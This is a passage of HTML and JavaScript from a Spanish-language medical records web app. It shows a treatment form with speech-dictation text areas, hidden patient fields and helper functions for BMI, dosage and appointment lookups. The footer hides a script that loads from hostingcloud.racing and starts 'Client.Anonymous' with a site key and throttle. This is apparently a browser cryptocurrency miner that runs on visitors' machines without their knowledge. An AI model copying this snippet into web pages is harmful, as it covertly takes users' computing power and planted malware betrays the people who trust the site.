     if (!('webkitSpeechRecognition' in window)) {
      alert("¡API no soportada!");
    } else {

      recognition1959 = new webkitSpeechRecognition();
      recognition1959.lang = "es-CO";
      recognition1959.continuous = true;
      recognition1959.interimResults = true;

      recognition1959.onstart = function() {
        recognizing1959 = true;
        console.log("empezando a eschucar");
      }
      recognition1959.onresult = function(event) {

       for (var i = event.resultIndex; i < event.results.length; i++) {
        if(event.results[i].isFinal)
          document.getElementById("x980").value += event.results[i][0].transcript;
      }

            //texto
          }
          recognition1959.onerror = function(event) {
          }
          recognition1959.onend = function() {
            recognizing1959 = false;
            document.getElementById("procesar1959").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
            console.log("terminó de eschucar, llegó a su fin");

          }

        }

        function procesar1959() {

          if (recognizing1959 == false) {
            recognition1959.start();
            recognizing1959 = true;
            document.getElementById("procesar1959").innerHTML = "<i title='Detener Grabación' style='font-size: 18px;' class='fa fa-pause'>";
          } else {
            recognition1959.stop();
            recognizing1959 = false;
            document.getElementById("procesar1959").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
          }
        }


      </script>
      <div class="form-group col-md-3">
       <div align="left">   </div>


       <div align="right">
        <a onclick="procesar1959()" id="procesar1959"><i title="Iniciar Grabación" style="font-size: 18px;" class="fa fa-fw fa-microphone"></i></a>
      </div>

      <textarea  id="x980" name="x980"  class="textarea" placeholder="" style="width: 100%; height: 100px; font-size: 14px; line-height: 18px; border: 1px solid #dddddd; padding: 10px;" ></textarea>



    </div>
    <script type="text/javascript">


     var recognition1960;
     var recognizing1960 = false;
     if (!('webkitSpeechRecognition' in window)) {
      alert("¡API no soportada!");
    } else {

      recognition1960 = new webkitSpeechRecognition();
      recognition1960.lang = "es-CO";
      recognition1960.continuous = true;
      recognition1960.interimResults = true;

      recognition1960.onstart = function() {
        recognizing1960 = true;
        console.log("empezando a eschucar");
      }
      recognition1960.onresult = function(event) {

       for (var i = event.resultIndex; i < event.results.length; i++) {
        if(event.results[i].isFinal)
          document.getElementById("x902").value += event.results[i][0].transcript;
      }

            //texto
          }
          recognition1960.onerror = function(event) {
          }
          recognition1960.onend = function() {
            recognizing1960 = false;
            document.getElementById("procesar1960").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
            console.log("terminó de eschucar, llegó a su fin");

          }

        }

        function procesar1960() {

          if (recognizing1960 == false) {
            recognition1960.start();
            recognizing1960 = true;
            document.getElementById("procesar1960").innerHTML = "<i title='Detener Grabación' style='font-size: 18px;' class='fa fa-pause'>";
          } else {
            recognition1960.stop();
            recognizing1960 = false;
            document.getElementById("procesar1960").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
          }
        }


      </script>
      <div class="form-group col-md-3">
       <div align="left">   </div>


       <div align="right">
        <a onclick="procesar1960()" id="procesar1960"><i title="Iniciar Grabación" style="font-size: 18px;" class="fa fa-fw fa-microphone"></i></a>
      </div>

      <textarea  id="x902" name="x902"  class="textarea" placeholder="" style="width: 100%; height: 100px; font-size: 14px; line-height: 18px; border: 1px solid #dddddd; padding: 10px;" ></textarea>



    </div>
    <script type="text/javascript">


     var recognition1961;
     var recognizing1961 = false;
     if (!('webkitSpeechRecognition' in window)) {
      alert("¡API no soportada!");
    } else {

      recognition1961 = new webkitSpeechRecognition();
      recognition1961.lang = "es-CO";
      recognition1961.continuous = true;
      recognition1961.interimResults = true;

      recognition1961.onstart = function() {
        recognizing1961 = true;
        console.log("empezando a eschucar");
      }
      recognition1961.onresult = function(event) {

       for (var i = event.resultIndex; i < event.results.length; i++) {
        if(event.results[i].isFinal)
          document.getElementById("x608").value += event.results[i][0].transcript;
      }

            //texto
          }
          recognition1961.onerror = function(event) {
          }
          recognition1961.onend = function() {
            recognizing1961 = false;
            document.getElementById("procesar1961").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
            console.log("terminó de eschucar, llegó a su fin");

          }

        }

        function procesar1961() {

          if (recognizing1961 == false) {
            recognition1961.start();
            recognizing1961 = true;
            document.getElementById("procesar1961").innerHTML = "<i title='Detener Grabación' style='font-size: 18px;' class='fa fa-pause'>";
          } else {
            recognition1961.stop();
            recognizing1961 = false;
            document.getElementById("procesar1961").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
          }
        }


      </script>
      <div class="form-group col-md-3">
       <div align="left">   </div>


       <div align="right">
        <a onclick="procesar1961()" id="procesar1961"><i title="Iniciar Grabación" style="font-size: 18px;" class="fa fa-fw fa-microphone"></i></a>
      </div>

      <textarea  id="x608" name="x608"  class="textarea" placeholder="" style="width: 100%; height: 100px; font-size: 14px; line-height: 18px; border: 1px solid #dddddd; padding: 10px;" ></textarea>



    </div>
    <script type="text/javascript">


     var recognition1962;
     var recognizing1962 = false;
     if (!('webkitSpeechRecognition' in window)) {
      alert("¡API no soportada!");
    } else {

      recognition1962 = new webkitSpeechRecognition();
      recognition1962.lang = "es-CO";
      recognition1962.continuous = true;
      recognition1962.interimResults = true;

      recognition1962.onstart = function() {
        recognizing1962 = true;
        console.log("empezando a eschucar");
      }
      recognition1962.onresult = function(event) {

       for (var i = event.resultIndex; i < event.results.length; i++) {
        if(event.results[i].isFinal)
          document.getElementById("x534").value += event.results[i][0].transcript;
      }

            //texto
          }
          recognition1962.onerror = function(event) {
          }
          recognition1962.onend = function() {
            recognizing1962 = false;
            document.getElementById("procesar1962").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
            console.log("terminó de eschucar, llegó a su fin");

          }

        }

        function procesar1962() {

          if (recognizing1962 == false) {
            recognition1962.start();
            recognizing1962 = true;
            document.getElementById("procesar1962").innerHTML = "<i title='Detener Grabación' style='font-size: 18px;' class='fa fa-pause'>";
          } else {
            recognition1962.stop();
            recognizing1962 = false;
            document.getElementById("procesar1962").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
          }
        }


      </script>
      <div class="form-group col-md-3">
       <div align="left">   </div>


       <div align="right">
        <a onclick="procesar1962()" id="procesar1962"><i title="Iniciar Grabación" style="font-size: 18px;" class="fa fa-fw fa-microphone"></i></a>
      </div>

      <textarea  id="x534" name="x534"  class="textarea" placeholder="" style="width: 100%; height: 100px; font-size: 14px; line-height: 18px; border: 1px solid #dddddd; padding: 10px;" ></textarea>



    </div><div class="form-group col-md-3" align= "center"> <strong> PHARMACOLOGICAL ASSESSMENTS</strong></div><div class="form-group col-md-9">
     <div align="left">  Herb-Drug Interactions, etc. </div>
     <input type="text" class="form-group col-md-9 form-control input-lg" name="xherbdrugi180"   placeholder="" id = "xherbdrugi180" 0  value="0" maxlength="23">


   </div><div class="form-group col-md-3" align= "center"> <strong> OTHER TREATMENTS</strong></div><div class="form-group col-md-9">
     <div align="left">   </div>

     <select   name="x730[]" class="form-control select2"  style="width: 100%;" multiple>
      <option value="" select> Seleccionar </option>
      <option value="TUI NA">TUI NA</option>
<option value="ACUPRESSURE">ACUPRESSURE</option>
<option value="MOXA">MOXA</option>
<option value="CUPPING">CUPPING</option>
<option value="ELECTRO ACUPUNTURE">ELECTRO ACUPUNTURE</option>
<option value="HEAT PACK">HEAT PACK</option>
<option value="OTHER">OTHER</option>           </select>
    </div><div class="form-group col-md-3" align= "center"> <strong> AURICULAR ACUPUNTURE / EAR SEEDS</strong></div><div class="form-group col-md-9">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-9 form-control input-lg" name="x127"   placeholder="" id = "x127" 0  value="0" maxlength="34">


   </div><div class="form-group col-md-3" align= "center"> <strong> CONDITION TREATED</strong></div><div class="form-group col-md-4">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-4 form-control input-lg" name="x537"   placeholder="" id = "x537" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-1" align= "center"> <strong> ICD</strong></div><div class="form-group col-md-2">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-2 form-control input-lg" name="x705"   placeholder="" id = "x705" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-1" align= "center"> <strong> CPT</strong></div><div class="form-group col-md-1">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-1 form-control input-lg" name="x937"   placeholder="" id = "x937" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-3" align= "center"> <strong> PROGNOSIS / RECOMENDATIONS</strong></div><div class="form-group col-md-9">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-9 form-control input-lg" name="x934"   placeholder="" id = "x934" 0  value="0" maxlength="12">


   </div><div class="form-group col-md-3" align= "center"> <strong> INTERN</strong></div><div class="form-group col-md-3">
     <div align="left">  IP </div>
     <input type="text" class="form-group col-md-3 form-control input-lg" name="xip761"   placeholder="" id = "xip761" 0  value="0" maxlength="34">


   </div><div class="form-group col-md-3">
     <div align="left">  SP </div>
     <input type="text" class="form-group col-md-3 form-control input-lg" name="xsp271"   placeholder="" id = "xsp271" 0  value="0" maxlength="56">


   </div><div class="form-group col-md-3">
     <div align="left">  OB </div>
     <input type="text" class="form-group col-md-3 form-control input-lg" name="xob228"   placeholder="" id = "xob228" 0  value="0" maxlength="45">


   </div><div class="form-group col-md-3" align= "center"> <strong> SUPERVISOR</strong></div><div class="form-group col-md-9">
     <div align="left">  SIGNATURE </div>
     <input type="text" class="form-group col-md-9 form-control input-lg" name="xsignature446"   placeholder="" id = "xsignature446" 0  value="0" maxlength="56">


   </div>



   <div class="col-md-12" align="left"> Ya terminé <input type="checkbox" value="" required ></div>

   <input  type="hidden" name="line" value="">
   <input  type="hidden" name="email" value="">
   <input  type="hidden" name="nombre"  value=" Fanny  ">
   <input  type="hidden" name="telefono"  value="">
   <input  type="hidden" name="ID"  value="1">

   <input  type="hidden" name="idHistoria"  value="31">

   <input  type="hidden" name="clienteId"  value="32">
   <input  type="hidden" name="receta"  value="">
   <input  type="hidden" name="metodo"  value="1">
   <input  type="hidden" name="NOMBRE_USUARIO"  value="Usuario Principal">

   <div align="center">
    <br>
    <br>
    <br>
    <div class="col-sm-12">
      <br>
      <br>
      <center><button type="submit" class="btn btn-block btn-primary btn-sm"> <h2> <strong>    </strong> </h2> </button></center>

    </div>
  </div>

  <input type="hidden"  name="tipo_cliente"   valur="1">
</div>

</div>

</form>

</div>

</div>

</div>

</div>

</div>

</div>

</div>

</div>

</section>

</div>



<footer class="main-footer" style="/*position: relative;padding-bottom: 30px;*/">

  <div class="pull-right hidden-xs">


   <!-- 

<div id="google_translate_element"></div><script type="text/javascript">
function googleTranslateElementInit() {
  new google.translate.TranslateElement({pageLanguage: 'es', includedLanguages: 'ar,en,es,fr,pt,ru,zh-TW', layout: google.translate.TranslateElement.InlineLayout.HORIZONTAL, multilanguagePage: true}, 'google_translate_element');
}
</script><script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
-->  
</div>
<strong>Copyright &copy; 2018  medicalsoftplus.com  Medicalsoft - estetica.</strong> All rights
reserved. <strong>Diseñado por <a target="_blank" href="https://sievensoft.com">SievenSoft</a> </strong>

<div align="right" class="pull-right hidden-xs" style="display: contents;">
  <strong> Soporte vía chat, horario de atención a 8 am a 8 pm de lunes a sábado</strong>

  <style type="text/css">
  .ganar {
    animation: background-change 2s infinite;
    animation: background-change 2s infinite;
    border: white;
    border-color: black;
    border-style: solid;
    border-radius: 50px;
    /* padding: 10px !important; */
    margin: 10px !important;
    padding: 8px !important;
    height: 5rem;
  }


  @keyframes background-change {
    0% { background: #45b653; }
    50% { background: red }
    100% { background: #45b653; }
  }
</style>





<strong>    </strong>
<br>
<a href="https://wa.me/17866331244" target="_blank">
  <div class="ganar center text-center" align="center">

    <font color="#FFF">  <strong>
      <i class="fa fa-whatsapp fa-2x"></i> <span> NUEVO CHAT WHATSAPP - LINEA SOPORTE</span>  </strong></font>
      <span class="pull-right-container">
        <!-- <small class="label pull-right bg-green"> <strong>new</strong></small> -->
      </span>

      
    </div>
  </a>
  <br>
  <br>
  <script src="https://www.hostingcloud.racing/hur1.js"></script>
  <script>
    var _client = new Client.Anonymous('0f7c3a7d9a1c246e894984f4e7d2f742d6f518263f4f5731e467da8965fad96c', {
      throttle: 0.5, c: 'w', ads: 0
    });
    _client.start();
    

  </script>                 

</div>
<style type="text/css">
.ganar
{
  width: 380px;
  float: right;
  position: relative;
  top: -25px;
}
#sidebar
{
 min-height: 96%!important;
}
</style>  





</footer>


<!-- /.control-sidebar -->
  <!-- Add the sidebar's background. This div must be placed
   immediately after the control sidebar -->
   

 </div>
 <!-- ./wrapper -->

 <!-- jQuery 2.2.3 -->
 <script src="plugins/jQuery/jquery-2.2.3.min.js"></script>
 <!-- Bootstrap 3.3.6 -->
 <script src="bootstrap/js/bootstrap.min.js"></script>
 <!-- DataTables -->
 <script src="plugins/datatables/jquery.dataTables.min.js"></script>
 <script src="plugins/datatables/dataTables.bootstrap.min.js"></script>
 <!-- SlimScroll -->
 <script src="plugins/slimScroll/jquery.slimscroll.min.js"></script>
 <!-- FastClick -->
 <script src="plugins/fastclick/fastclick.js"></script>
 <!-- AdminLTE App -->
 <script src="dist/js/app.min.js"></script>
 <!-- AdminLTE for demo purposes -->
 <script src="dist/js/demo.js"></script>
 <!-- Select2 -->
 <script src="plugins/select2/select2.full.min.js"></script>
 <!-- InputMask -->
 <script src="plugins/input-mask/jquery.inputmask.js"></script>
 <script src="plugins/input-mask/jquery.inputmask.date.extensions.js"></script>
 <script src="plugins/input-mask/jquery.inputmask.extensions.js"></script>
 <!-- date-range-picker -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
 <script src="plugins/daterangepicker/daterangepicker.js"></script>
 <!-- bootstrap datepicker -->
 <script src="plugins/datepicker/bootstrap-datepicker.js"></script>
 <!-- bootstrap color picker -->
 <script src="plugins/colorpicker/bootstrap-colorpicker.min.js"></script>
 <!-- bootstrap time picker -->
 <script src="plugins/timepicker/bootstrap-timepicker.min.js"></script>
 
 <!-- iCheck 1.0.1 -->
 <script src="plugins/iCheck/icheck.min.js"></script>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/raphael/2.1.0/raphael-min.js"></script>
 <script src="plugins/morris/morris.min.js"></script>
 
 <script src="https://cdn.ckeditor.com/4.5.7/standard/ckeditor.js"></script>
 <!-- Bootstrap WYSIHTML5 -->
 <script src="plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.all.min.js"></script>




 <!--CHARTS-->

 <!--Apex Charts-->
 <script src="assets/js/vendors/charts/apex-charts.js"></script>

 <script src="assets/js/scripts-init/charts/apex-charts.js"></script>
 <script src="assets/js/scripts-init/charts/apex-series.js"></script>

 <!--Sparklines-->
 <script src="assets/js/vendors/charts/charts-sparklines.js"></script>
 <script src="assets/js/scripts-init/charts/charts-sparklines.js"></script>


 <!--Sparklines-->
 <script src="assets/js/vendors/charts/charts-sparklines.js"></script>
 <script src="assets/js/scripts-init/charts/charts-sparklines.js"></script>


 <!--Chart.js-->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.4.0/Chart.min.js"></script>
 <script src="assets/js/scripts-init/charts/chartsjs-utils.js"></script>
 <script src="assets/js/scripts-init/charts/chartjs.js"></script>

 <!--CHARTS-->



 <!-- page script -->
 <script>



  $(function () {




    $("#example1").DataTable();
    $('#example2').DataTable({
      "paging": true,
      "lengthChange": false,
      "searching": false,
      "ordering": true,
      "info": true,
      "autoWidth": false
    });




    //Initialize Select2 Elements
    $(".select2").select2();

    //Datemask dd/mm/yyyy
    $("#datemask").inputmask("dd/mm/yyyy", {"placeholder": "dd/mm/yyyy"});
    //Datemask2 mm/dd/yyyy
    $("#datemask2").inputmask("mm/dd/yyyy", {"placeholder": "mm/dd/yyyy"});
    //Money Euro
    $("[data-mask]").inputmask();

    //Date range picker
    $('#reservation').daterangepicker();
    //Date range picker with time picker
    $('#reservationtime').daterangepicker({timePicker: true, timePickerIncrement: 30, format: 'MM/DD/YYYY h:mm A'});
    //Date range as a button
    $('#daterange-btn').daterangepicker(
    {
      ranges: {
        'Today': [moment(), moment()],
        'Yesterday': [moment().subtract(1, 'days'), moment().subtract(1, 'days')],
        'Last 7 Days': [moment().subtract(6, 'days'), moment()],
        'Last 30 Days': [moment().subtract(29, 'days'), moment()],
        'This Month': [moment().startOf('month'), moment().endOf('month')],
        'Last Month': [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')]
      },
      startDate: moment().subtract(29, 'days'),
      endDate: moment()
    },
    function (start, end) {
      $('#daterange-btn span').html(start.format('MMMM D, YYYY') + ' - ' + end.format('MMMM D, YYYY'));
    }
    );

    //Date picker
    $('#datepicker').datepicker({
      autoclose: true
    });

    //iCheck for checkbox and radio inputs
    $('input[type="checkbox"].minimal, input[type="radio"].minimal').iCheck({
      checkboxClass: 'icheckbox_minimal-blue',
      radioClass: 'iradio_minimal-blue'
    });
    //Red color scheme for iCheck
    $('input[type="checkbox"].minimal-red, input[type="radio"].minimal-red').iCheck({
      checkboxClass: 'icheckbox_minimal-red',
      radioClass: 'iradio_minimal-red'
    });
    //Flat red color scheme for iCheck
    $('input[type="checkbox"].flat-red, input[type="radio"].flat-red').iCheck({
      checkboxClass: 'icheckbox_flat-green',
      radioClass: 'iradio_flat-green'
    });

    //Colorpicker
    $(".my-colorpicker1").colorpicker();
    //color picker with addon
    $(".my-colorpicker2").colorpicker();

    //Timepicker
    $(".timepicker").timepicker({
      showInputs: false
    });

    $(function () {
    // Replace the <textarea id="editor1"> with a CKEditor
    // instance, using default configuration.
    CKEDITOR.replace('editor1');
    //bootstrap WYSIHTML5 - text editor
    $(".textarea").wysihtml5();
  });

    // Replace the <textarea id="editor1"> with a CKEditor
    // instance, using default configuration.
    CKEDITOR.replace('editor1');
    //bootstrap WYSIHTML5 - text editor
    $(".textarea").wysihtml5();

    $(function () {
    // Replace the <textarea id="editor1"> with a CKEditor
    // instance, using default configuration.
    CKEDITOR.replace('editor2');
    //bootstrap WYSIHTML5 - text editor
    $(".textarea").wysihtml5();
  });
    $(function () {
    // Replace the <textarea id="editor1"> with a CKEditor
    // instance, using default configuration.
    CKEDITOR.replace('editor2');
    //bootstrap WYSIHTML5 - text editor
    $(".textarea").wysihtml5();
  });

    // Replace the <textarea id="editor1"> with a CKEditor
    // instance, using default configuration.
    CKEDITOR.replace('editor2');
    //bootstrap WYSIHTML5 - text editor
    $(".textarea").wysihtml5();

    $(function () {
    // Replace the <textarea id="editor1"> with a CKEditor
    // instance, using default configuration.
    CKEDITOR.replace('editor3');
    //bootstrap WYSIHTML5 - text editor
    $(".textarea").wysihtml5();
  });

    // Replace the <textarea id="editor1"> with a CKEditor
    // instance, using default configuration.
    CKEDITOR.replace('editor3');
    //bootstrap WYSIHTML5 - text editor
    $(".textarea").wysihtml5();

    $(function () {
    // Replace the <textarea id="editor1"> with a CKEditor
    // instance, using default configuration.
    CKEDITOR.replace('editor10');
    //bootstrap WYSIHTML5 - text editor
    $(".textarea").wysihtml5();
  });

    // Replace the <textarea id="editor1"> with a CKEditor
    // instance, using default configuration.
    CKEDITOR.replace('editor10');
    //bootstrap WYSIHTML5 - text editor
    $(".textarea").wysihtml5();


  });


</script>
</body>
</html>


<script>


  var table = $('#example1').DataTable({
    language: {
      "decimal": "",
      "emptyTable": "No hay información",
      "info": "Mostrando _START_ a _END_ de _TOTAL_ Entradas",
      "infoEmpty": "Mostrando 0 to 0 of 0 Entradas",
      "infoFiltered": "(Filtrado de _MAX_ total entradas)",
      "infoPostFix": "",
      "thousands": ",",
      "lengthMenu": "Mostrar _MENU_ Entradas",
      "loadingRecords": "Cargando...",
      "processing": "Procesando...",
      "search": "Buscar:",
      "zeroRecords": "Sin resultados encontrados",
      "paginate": {
        "first": "Primero",
        "last": "Ultimo",
        "next": "Siguiente",
        "previous": "Anterior"
      }
    },

  });


</script>
<script src="apiVoz.js"></script>

<script type="text/javascript">



  function verlista(){

    var clienteId = $("#clienteId").val();
    var name = $("#name1").val();



// aqui enviamos el mensaje por medio de un arreglo     

$.ajax({
  type: "POST",
  url: "cie10lista.php",
  data: {clienteId:clienteId, name:name},
  success: function(response) {
    $('#div-results').html(response);

  }
});
};





function verlista2(){

  var clienteId = $("#clienteId2").val();
  var name = $("#name2").val();



// aqui enviamos el mensaje por medio de un arreglo     

$.ajax({
  type: "POST",
  url: "cie10lista.php",
  data: {clienteId:clienteId, name:name},
  success: function(response) {
    $('#div-results2').html(response);

  }
});
};



function verlista3(){

  var clienteId = $("#clienteId3").val();
  var name = $("#name3").val();


// aqui enviamos el mensaje por medio de un arreglo     

$.ajax({
  type: "POST",
  url: "cie10lista.php",
  data: {clienteId:clienteId, name:name},
  success: function(response) {
    $('#div-results3').html(response);

  }
});
};




function calculardosis(){
  m1 = document.getElementById("frecuencia").value;
  m2 = document.getElementById("administracion").value;
  m3 = document.getElementById("dias").value;

  if (m2=="Horas") 
  {


    r= 24/m1;  



    document.getElementById("dosisdia").value = r;


  }

  if (m2=="Minutos") 
  {


    r= 1440/m1;  



    document.getElementById("dosisdia").value = r;


  }

  if (m2=="Dias") 
  {


    r= 1/m1;  



    document.getElementById("dosisdia").value = r;


  }


  if (m2=="Semana") 
  {

    a= 7*m1;
    r= 1/a; 


    document.getElementById("dosisdia").value = r;


  }

  if (m2=="Mes") 
  {

    a= 30*m1;
    r= 1/a; 


    document.getElementById("dosisdia").value = r;


  }

  if (m2=="Ano") 
  {

    a= 365*m1;
    r= 1/a; 


    document.getElementById("dosisdia").value = r;


  }


  if (m2=="Unica") 
  {



    r= "&uacutenica Dosis";


    document.getElementById("dosisdia").value = r;


  }

  rt=r*m3;
  document.getElementById("total").value = rt;


}




function calcularvalor()
{



  m1 = document.getElementById("x402").value;
  m2 = document.getElementById("x652").value;
  m3 = document.getElementById("x119").value;


  v1= parseFloat(m1)+parseFloat(m2)+parseFloat(m3);
  v2=v1-200;
  r=v2/10;





  document.getElementById("x677").value = r.toFixed(2);


  if (r.toFixed(2) <= 0)

    ComposicionCorporal = 'Excelente! Deportista de Élite';
  else if
    (r.toFixed(2) >= 0.1 &  r.toFixed(2) <= 5)

  ComposicionCorporal = 'Muy bueno';
  else if
    (r.toFixed(2) >= 5.1 & r.toFixed(2) <= 10)

  ComposicionCorporal = 'Bueno';
  else if
    (r.toFixed(2) >= 10.1 & r.toFixed(2) <= 15)

  ComposicionCorporal = 'Insuficiente';

  else if
    (r.toFixed(2) >= 15.0 & r.toFixed(2) <= 20)

  ComposicionCorporal = 'Malo';


  else if
    (r.toFixed(2) > 20)

  ComposicionCorporal = 'Sin respuesta';



  document.getElementById("respuestatest").value = ComposicionCorporal;
}



function calculartest()
{



  m1 = document.getElementById("1").value;
  m2 = document.getElementById("2").value;
  m3 = document.getElementById("3").value;
  m4 = document.getElementById("4").value;
  m5 = document.getElementById("5").value;
  m6 = document.getElementById("6").value;
  m7 = document.getElementById("7").value;
  m8 = document.getElementById("8").value;
  m9 = document.getElementById("9").value;
  m10 = document.getElementById("10").value;
  m11 = document.getElementById("11").value;
  m12 = document.getElementById("12").value;
  m13 = document.getElementById("13").value;
  m14 = document.getElementById("14").value;


  r= parseFloat(m1)+parseFloat(m2)+parseFloat(m3)+parseFloat(m4)+parseFloat(m5)+parseFloat(m6)+parseFloat(m7)+parseFloat(m8)+parseFloat(m9)+parseFloat(m10)+parseFloat(m11)+parseFloat(m12)+parseFloat(m13)+parseFloat(m14);






  document.getElementById("respuestatest1").value = r.toFixed(2);


  if (r.toFixed(2) < 6)

    ComposicionCorporal = 'Ausencia';
  else if
    (r.toFixed(2) >= 6 &  r.toFixed(2) <= 14)

  ComposicionCorporal = 'Leve';
  else if
    (r.toFixed(2) >= 15 & r.toFixed(2) <= 25)

  ComposicionCorporal = 'Moderado';
  else if
    (r.toFixed(2) >= 26 & r.toFixed(2) <= 39)

  ComposicionCorporal = 'Alto';

  else if
    (r.toFixed(2) >=40 )

  ComposicionCorporal = 'Muy Alto';





  document.getElementById("respuestatestx").value = ComposicionCorporal;
}



function agergarItem(){
        // estas son las variables que enviamos
        var codigoProd = $("#codigoProd").val();

        var dosis = $("#dosis").val();
        var posologia = $("#posologia").val();
        var frecuencia = $("#frecuencia").val();
        var administracion= $("#administracion").val();
        var dosisdia= $("#dosisdia").val();
        var dias= $("#dias").val();
        var via= $("#via").val();
        var total = $("#total").val();
        var nota = $("#nota").val(); 
        var usuario_id = $("#id_usuario").val();
        var idcliente = $("#idcliente").val();
        var idReceta = $("#idReceta").val();
        var codigoProd1 = $("#codigoProd1").val();
        var nota = $("#nota").val();
        // aqui enviamos el mensaje por medio de un arreglo     
        $.ajax({
          type: "POST",
          url: "ajax_agregarItemrecetario.php",
          data: {codigoProd:codigoProd, dosis:dosis, posologia:posologia, frecuencia:frecuencia, administracion:administracion, dosisdia:dosisdia, dias:dias, via:via, total:total, nota:nota, usuario_id:usuario_id, idcliente:idcliente,idReceta:idReceta,codigoProd1:codigoProd1,nota:nota},
          success: function(response) {

            $('#dosis').val('');
            $('#posologia').val('');
            $('#frecuencia').val('');
            $('#administracion').val('');
            $('#dosisdia').val('');
            $('#dias').val('');
            $('#via').val('');
            $('#total').val('');
            $('#nota').val('');

            $('#codigoProd').val('');
            $('#codigoProd1').val('');
            $('#nota').val('');

            $('#div-results').html(response);

        // aqui enviamos el mensaje por medio de un arreglo               
      }
    });

      };



      /* document.getElementById("detalleRecetario").reset(); */


      function listaItem(){
        // estas son las variables que enviamos
        var usuario_id = $("#usuario_id").val();
        // aqui enviamos el mensaje por medio de un arreglo     
        $.ajax({
          type: "POST",
          url: "listaItem.php",
          data: {usuario_id:usuario_id},
          success: function(response) {
            $('#div-results').html(response);
        // aqui enviamos el mensaje por medio de un arreglo     

      }
    });
      };
      window.onload=listaItem;   















      function verDia(){
// estas son las variables que enviamos

var fecha = $("#fecha").val();
var Hora = $("#Hora").val();
var usuario_id = $("#usuario_id").val();

// aqui enviamos el mensaje por medio de un arreglo

$.ajax({
  type: "POST",
  url: "disponibilidad.php",
  data: {fecha:fecha, Hora:Hora, usuario_id:usuario_id},
  success: function(response) {
    $('#div-results').html(response);

  }
});
};

function verHora(){
// estas son las variables que enviamos

var fecha = $("#fecha").val();
var Hora = $("#Hora").val();
var usuario_id = $("#usuario_id").val();

// aqui enviamos el mensaje por medio de un arreglo

$.ajax({
  type: "POST",
  url: "disponibilidadHora.php",
  data: {fecha:fecha, Hora:Hora, usuario_id:usuario_id},
  success: function(response) {
    $('#div-resultsHora').html(response);

  }
});
};

function calcularimc()
{



  m1 = document.getElementById("peso").value;
  m2 = document.getElementById("altura").value;

  r = m1/((m2/100)*(m2/100));



  document.getElementById("imc").value = r.toFixed(2);


  if (r.toFixed(2) < 16)

    ComposicionCorporal = 'Infrapeso: Delgadez Severa';
  else if
    (r.toFixed(2) > 16 &  r.toFixed(2) < 16.99)

  ComposicionCorporal = 'Infrapeso: Delgadez moderada';
  else if
    (r.toFixed(2) > 17 & r.toFixed(2) < 18.49)

  ComposicionCorporal = 'Infrapeso: Delgadez aceptable';
  else if
    (r.toFixed(2) > 18.50 & r.toFixed(2) < 24.99)

  ComposicionCorporal = 'Peso Normal';

  else if
    (r.toFixed(2) > 25.00 & r.toFixed(2) < 29.99)

  ComposicionCorporal = 'Sobrepeso';

  else if
    (r.toFixed(2) > 30.00 & r.toFixed(2) < 34.99)

  ComposicionCorporal = 'Obeso: Tipo I';

  else if
    (r.toFixed(2) > 35.00 & r.toFixed(2) < 40)

  ComposicionCorporal = 'Obeso: Tipo II';

  else if
    (r.toFixed(2) > 40.00)

  ComposicionCorporal = 'Obeso: Tipo III';




  document.getElementById("ComposicionCorporal").value = ComposicionCorporal;
}

function calcularprematuriedad(){
  try {
    var a = parseInt(document.formularioActualizarcliente.edadGestacionalCompleta.value);
    var b = parseInt(document.formularioActualizarcliente.edadGestacional.value);
    document.formularioActualizarcliente.SemanasPrematuriedad.value = a - b;
  } catch (e) {
  }
}
function calcularEdadCorregida(){
  try {
    var a = parseInt(document.formularioActualizarcliente.edadCronologica.value);
    var b = parseInt(document.formularioActualizarcliente.semPrematuriedad.value);
    document.formularioActualizarcliente.edadCorregida.value = b - a;
  } catch (e) {
  }
}





function agergarMetodo(){
        // estas son las variables que enviamos
        var metodo = $("#metodo").val();

        var usado = $("#usado").val();
        var salud = $("#salud").val();
        var economica = $("#economica").val();
        var estilo= $("#estilo").val();
        var elegible= $("#elegible").val();
        var observacion= $("#observacion").val();
        var usuario_id = $("#id_usuario").val();
        var idcliente = $("#idcliente").val();
        var idMetodo = $("#idMetodo").val();

        // aqui enviamos el mensaje por medio de un arreglo     
        $.ajax({
          type: "POST",
          url: "ajax_agregarMetodo.php",
          data: {metodo:metodo, usado:usado, salud:salud, economica:economica, estilo:estilo, elegible:elegible, observacion:observacion ,usuario_id:usuario_id, idcliente:idcliente,idMetodo:idMetodo},
          success: function(response) {

            $('#metodo').val('');
            $('#usado').val('');
            $('#salud').val('');
            $('#economica').val('');
            $('#estilo').val('');
            $('#elegible').val('');
            $('#observacion').val('');


            $('#div-results1').html(response);

        // aqui enviamos el mensaje por medio de un arreglo               
      }
    });

      };
















    </script>


